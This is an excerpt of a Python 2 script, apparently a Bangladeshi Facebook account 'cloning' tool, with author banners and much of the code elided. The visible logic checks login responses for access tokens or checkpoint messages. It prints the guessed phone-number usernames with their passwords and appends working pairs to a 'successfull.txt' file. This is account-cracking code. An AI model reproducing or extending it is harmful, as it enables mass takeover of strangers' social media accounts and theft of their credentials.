...
print("\033[0;91mThis Tool's Make By :Itz HrddO")

psb('\x1b[1;92mBangladesh 6 Digit Cloning Start please Wait__This tools maked  by It"s Itz HrddO ')
psb('\x1b[1;92m                     Assalamualaikum')
psb('\x1b[1;92mThanks for use my tools __ Please Amar Jonno Duaa Korbaen......')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : It"s Itz HrddO '
    print '\033[0;94mFACEBOOK : Itz HrddO  YT'
    print '\033[0;96mCreator : https://www.facebook.com/Itz HrddO.yt.5'
    print '\033[0;96mpage: It`s Itz HrddO  & The dark hunter mafia'
    print ''
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Itz HrddO-BD-CP\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [Itz HrddO-BD-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 Itz HrddO-bd-6digt.py')
